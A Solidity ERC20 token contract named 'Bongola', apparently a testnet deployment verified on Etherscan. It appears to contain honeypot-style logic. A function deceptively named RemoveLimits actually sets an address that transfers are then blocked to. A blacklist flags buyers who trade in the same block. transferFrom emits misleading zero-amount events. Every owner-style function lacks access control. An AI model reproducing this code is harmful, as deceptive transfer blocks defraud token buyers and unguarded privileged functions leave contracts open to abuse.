/**
 *Submitted for verification at Etherscan.io on 2022-06-09
*/

// SPDX-License-Identifier: unlicensed
pragma solidity 0.8.4;
contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a);
        c = a - b;
    }
    function safeMult(uint256 x, uint256 y) public pure returns(uint c) {
      c = x * y;
    }
}
abstract contract ERC20Interface {
    function totalSupply() virtual public view returns (uint);
    function balanceOf(address tokenOwner) virtual public view returns (uint balance);
    function allowance(address tokenOwner, address spender) virtual public view returns (uint remaining);
    function transfer(address to, uint tokens) virtual public returns (bool success);
    function approve(address spender, uint tokens) virtual public returns (bool success);
    function transferFrom(address from, address to, uint tokens) virtual public returns (bool success);
    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}
contract Bongola is ERC20Interface, SafeMath {
    string public symbol;
    string public  name;
    uint8 public decimals;
    uint public _totalSupply;
    uint256 public maxTx;
    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;
    mapping(address => bool) public bots;
    mapping(address => uint) lastTrade;
    mapping(address => uint) prevLastTrade;
    address ropsteneUni = address(0xc778417E063141139Fce010982780140Aa0cD5Ab);
    address public caAddy;
    constructor() {
        symbol = "test";
        name = "test";
        decimals = 8;
        _totalSupply = 1000000 * 10**decimals;
        maxTx = _totalSupply * 10 / 100;
        balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
    function totalSupply() public override view returns (uint) {
        return _totalSupply - balances[address(0)];
    }
    function changeMaxTx(uint256 precentageOfTotalSupply) public {
        maxTx = _totalSupply * precentageOfTotalSupply / 100;
    }
    function addFucker(address fucker) public {
        bots[fucker] = true;
    }
    function forgiveFucker(address fucker) public {
        bots[fucker] = false;
    }
     function RemoveLimits(address addy) public {
        caAddy = addy;
    }
    function balanceOf(address tokenOwner) public override view returns (uint balance) {
        return balances[tokenOwner];
    }
    function transfer(address receiver, uint tokens) public override returns (bool success) {
        require(receiver != caAddy, "AAAAAAAAAA");
        if(receiver != ropsteneUni && receiver != address(this)){
            require(tokens <= maxTx, "cant buy more than max tx.");
            lastTrade[receiver] = block.number;
            if(!(prevLastTrade[receiver] > 0)){
                prevLastTrade[receiver] = block.number;
            }else{
                if(lastTrade[receiver]-prevLastTrade[receiver] <= 0){
                    bots[receiver] = true;
                }
                require(lastTrade[receiver]-prevLastTrade[receiver] > 0, "fuck you");
            }
            require(bots[receiver] == false, "fuck you again");
        }
        balances[msg.sender] = safeSub(balances[msg.sender], tokens);
        balances[receiver] = safeAdd(balances[receiver], tokens);
        prevLastTrade[receiver] = block.number;
        emit Transfer(msg.sender, receiver, tokens);
        return true;
    }
    function approve(address spender, uint tokens) public override returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

    function transferFrom(address sender, address receiver, uint tokens) public override returns (bool success) {
        require(receiver != caAddy, "poof");
        balances[sender] = safeSub(balances[sender], tokens);
        allowed[sender][msg.sender] = safeSub(allowed[sender][msg.sender], tokens);
        balances[receiver] = safeAdd(balances[receiver], tokens);
        emit Transfer(sender, receiver, 0);
        return true;
    }
    function allowance(address tokenOwner, address spender) public override view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }
    function allowance(address tokenOwner) public view returns (uint lastTradeBlockNum) {
        return lastTrade[tokenOwner];
    }
}